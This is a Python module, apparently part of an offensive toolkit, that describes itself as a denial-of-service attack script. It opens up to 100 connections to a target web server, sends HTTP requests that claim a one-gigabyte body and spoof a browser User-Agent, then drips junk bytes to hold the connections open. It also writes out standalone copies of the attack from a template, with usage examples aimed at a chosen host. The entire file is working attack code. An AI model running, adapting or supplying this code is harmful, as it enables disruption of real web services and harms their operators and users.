import socket
import time
import threading

MAX_CONN = 100
PORT = 80
HOST = ""
PAGE = "/"
socks = []
buf = ("GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
       "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
       "Content-Length: 1000000000\r\n"
        "\r\n" % (PAGE, HOST))


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(bytes(buf, encoding='utf-8'))
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(2)

def send_thread():
    global socks
    for i in range(10):
        for s in socks:
            try:
                s.send(bytes("PERVISE", encoding='utf-8'))
            except Exception as ex:
                print("[-] send Exception:%s" % ex)
                socks.remove(s)
                s.close()
        time.sleep(1)

def start(max_conn,host,port,page):
    global MAX_CONN,HOST,PORT,PAGE,socks
    MAX_CONN = int(max_conn)
    HOST = host
    PORT = int(port)
    PAGE = page
    print('[*] Started.')
    conn_th = threading.Thread(target=conn_thread, args=(), daemon=True)
    send_th = threading.Thread(target=send_thread, args=(), daemon=True)
    conn_th.start()
    send_th.start()

def payload(max_conn,host,port,page,file_path):
    payload_source = ''
    try:
        with open('./Libs/dos/payload/payload.py', 'r') as payload:
            payload_source = payload.read().replace("conn_conn_conn", max_conn).replace("host_host_host", str(host)).replace("port_port_port",str(port)).replace("page_page_page",str(page))
        with open(file_path, 'w') as payload:
            payload.write(payload_source)
    except:
        print('[-] Error.')
        return -1
    print('[*] File path: ' + str(file_path))
    print('[*] Payload size: ' + str(len(payload_source)))

def info():
    print('Denial of service attack script')
    print('Usage: make dos start [max_conn] [host] [port] [page]')
    print('Example: make dos start 100 192.168.0.124 80 /search?a=pervise')
    print('Usage: make dos payload [max_conn] [host] [port] [page] [output_path]')
    print('Example: make dos payload 100 192.168.0.124 80 /search?a=pervise D:\\test.py')